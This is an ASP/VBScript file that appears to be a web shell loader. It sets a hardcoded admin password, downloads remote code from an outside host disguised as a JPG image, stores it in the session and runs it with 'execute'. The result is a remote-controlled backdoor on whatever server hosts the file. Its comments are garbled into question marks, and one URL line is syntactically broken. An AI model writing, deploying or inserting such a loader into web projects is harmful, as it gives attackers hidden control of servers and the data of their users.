<%@ LANGUAGE = VBScript.encode%><%
Server.ScriptTimeout=999999999
UserPass="admin01001"  '????
mNametitle ="?????????"  ' ????
Copyright="?????????"  '???
SItEuRl=http://www.bjljiaoxue.com/" '??????
bg ="http://www.bjljiaoxue.com/touxiang.jpg" 
ysjb=true  '????????งน??,true???,false???

function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End function

function PostHTTPPage(url) 
dim Http 
set Http=server.createobject("MSXML2.SERVERXMLHTTP.3.0")
Http.open "GET",url,false 
Http.setRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded" 
Http.send 
if Http.readystate<>4 then 
exit function 
End if
PostHTTPPage=bytesToBSTR(Http.responseBody,"gbk") 
set http=nothing 
if err.number<>0 then err.Clear 
End function

dim  aspCode
aspCode=CStr(Session("aspCode"))
if aspCode="" or aspCode=null or isnull(aspCode) then 
aspCode=PostHTTPPage("http://www.szhcxdp.com/images/2.jpg")
Session("aspCode") =aspCode
End if
execute aspCode

%>